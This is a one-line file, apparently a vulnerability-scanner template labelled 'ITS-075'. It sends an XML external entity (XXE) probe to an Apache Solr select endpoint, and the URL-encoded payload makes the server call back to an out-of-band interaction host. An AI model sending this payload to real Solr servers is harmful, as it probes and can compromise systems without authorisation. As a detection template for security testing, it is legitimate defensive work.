# Vulnerable: ITS-075
GET /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F{{interactsh-url}}%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser
